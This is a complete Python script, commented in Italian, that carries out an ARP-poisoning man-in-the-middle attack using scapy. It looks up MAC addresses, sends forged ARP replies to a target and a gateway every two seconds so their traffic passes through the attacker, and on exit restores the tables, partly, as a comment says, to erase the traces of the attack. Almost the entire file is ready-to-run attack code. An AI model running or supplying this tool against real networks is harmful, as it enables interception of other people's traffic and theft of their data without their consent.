#!/usr/bin/env python
"""
ARP Spoofer - Attacco Man-in-the-Middle tramite ARP poisoning
Posiziona l'attaccante tra il target e il gateway per intercettare il traffico
"""

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    """
    Ottiene il MAC address di un dispositivo dato il suo IP.
    
    Funzionamento:
    - Crea un pacchetto ARP request per l'IP specificato
    - Lo incapsula in un frame Ethernet broadcast
    - Invia e attende la risposta
    - Estrae il MAC dalla risposta
    
    Args:
        ip: Indirizzo IP del dispositivo
    
    Returns:
        MAC address del dispositivo (es. "00:0c:29:xx:xx:xx")
    """
    # Crea ARP request: "Chi ha questo IP?"
    arp_request = scapy.ARP(pdst=ip)
    
    # Frame Ethernet broadcast per raggiungere tutti i dispositivi
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combina i due layer (Ethernet + ARP)
    arp_request_broadcast = broadcast / arp_request
    
    # Invia e riceve risposte (srp = send/receive at layer 2)
    # [0] prende solo le risposte ricevute (answered)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # Restituisce il MAC dalla prima risposta
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """
    Invia un pacchetto ARP falsificato al target.
    
    Funzionamento:
    - Dice al target: "L'IP spoof_ip corrisponde al MIO MAC"
    - Il target aggiorna la sua tabella ARP
    - Da questo momento, il traffico destinato a spoof_ip arriva a noi
    
    Args:
        target_ip: IP della vittima che riceverà il pacchetto falso
        spoof_ip: IP che vogliamo impersonare (es. il gateway)
    """
    # Ottiene il MAC reale del target (necessario per indirizzare il pacchetto)
    target_mac = get_mac(target_ip)
    
    # Crea pacchetto ARP reply (op=2) falsificato
    # pdst: destinatario del pacchetto
    # hwdst: MAC del destinatario
    # psrc: IP che stiamo impersonando (il MAC sorgente sarà il nostro di default)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Invia il pacchetto (layer 3, senza specificare Ethernet)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    Ripristina la tabella ARP con i valori corretti.
    
    Chiamata quando si interrompe l'attacco (CTRL+C) per:
    - Evitare di lasciare la vittima senza connettività
    - Pulire le tracce dell'attacco
    
    Args:
        destination_ip: IP del dispositivo da ripristinare
        source_ip: IP di cui ripristinare l'associazione corretta
    """
    # Ottiene i MAC reali di entrambi i dispositivi
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    # Crea pacchetto ARP con i valori CORRETTI
    # hwsrc: MAC reale del source (non il nostro)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    
    # Invia 4 volte per assicurarsi che venga recepito
    scapy.send(packet, verbose=False, count=4)


# === CONFIGURAZIONE ===
# IP della macchina Windows target
target_ip = "192.168.1.1"
# IP del gateway/router
gateway_ip = "192.168.1.2"

# === ESECUZIONE PRINCIPALE ===
try:
    packet_sent_count = 0
    
    # Loop infinito: continua a inviare pacchetti ARP falsificati
    # Necessario perché le tabelle ARP hanno un timeout
    while True:
        # Dice al TARGET: "Il gateway sono io"
        spoof(target_ip, gateway_ip)
        
        # Dice al GATEWAY: "Il target sono io"
        spoof(gateway_ip, target_ip)
        
        # Ora siamo nel mezzo: Target <-> Noi <-> Gateway
        
        packet_sent_count += 2
        # \r sovrascrive la riga (contatore aggiornato in-place)
        print("\r[+] Sent " + str(packet_sent_count)),
        sys.stdout.flush()
        
        # Attende 2 secondi prima del prossimo invio
        time.sleep(2)

except KeyboardInterrupt:
    # CTRL+C premuto: pulizia prima di uscire
    print("\n[-] Detected CTRL+C ...Resetting ARP tables..... Please wait.\n")
    
    # Ripristina le tabelle ARP di entrambi i dispositivi
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
